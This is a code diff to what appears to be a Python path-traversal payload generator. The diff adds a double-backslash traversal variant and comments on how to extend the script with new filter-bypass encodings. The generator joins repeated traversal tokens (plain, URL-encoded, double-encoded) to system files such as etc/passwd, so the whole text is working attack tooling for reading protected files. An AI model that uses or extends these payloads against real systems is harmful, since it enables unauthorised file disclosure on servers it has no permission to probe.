@@ -18,8 +18,21 @@ WINDOWS_FILES = [
 ]
 
 # Traversal / filter-bypass sequences (one "step up" per token, repeated by depth)
+#
+# TO ADD A NEW FORMAT IN FUTURE:
+#   Just add one line below. The script does:  token * depth + file + suffix
+#   e.g. token "FOO" at depth 3 for etc/passwd ->  FOOFOOFOOetc/passwd
+#   - Write a real backslash as \\  (Python escaping): "..\\" outputs  ..\
+#   - The file path keeps forward slashes by default (etc/passwd).
+#   - Backslash FILE separators (etc\passwd) are auto-applied ONLY for the
+#     "..\\" and "..\\\\" tokens. For any other backslash token, add it to the
+#     special-case block in gen() if you also want the file path converted.
+#   Template (uncomment, replace XXX):
+#   "XXX",                           # <short description of the bypass>
+#
 TRAVERSALS = [
-    "../", "..\\",                     # plain unix / windows
+    "../", "..\\",                     # plain unix / windows (single sep)
+    "..\\\\",                          # double-backslash separator  ..\\..\\
     "..%2f", "..%5c",                  # url-encoded / \
     "%2e%2e%2f", "%2e%2e%5c",          # fully url-encoded
     "..%252f", "..%255c",              # double url-encoded
@@ -57,6 +70,7 @@ def gen(files, start, end, wrappers, absolute):
     out = set()
     for f in files:
         f_bslash = f.replace("/", "\\")
+        f_dbslash = f.replace("/", "\\\\")
         # absolute paths (no traversal)
         if absolute:
             for ap in ABS_PREFIXES:
@@ -65,8 +79,14 @@ def gen(files, start, end, wrappers, absolute):
         # traversal payloads
         for trav in TRAVERSALS:
             plain_bslash = trav == "..\\"
-            tgt = f_bslash if plain_bslash else f
-            leads = ["", "\\"] if plain_bslash else [""]
+            double_bslash = trav == "..\\\\"
+            if double_bslash:
+                tgt = f_dbslash
+            elif plain_bslash:
+                tgt = f_bslash
+            else:
+                tgt = f
+            leads = ["", "\\"] if plain_bslash else (["", "\\\\"] if double_bslash else [""])
             for depth in range(start, end + 1):
                 seq = trav * depth
                 for lead in leads:
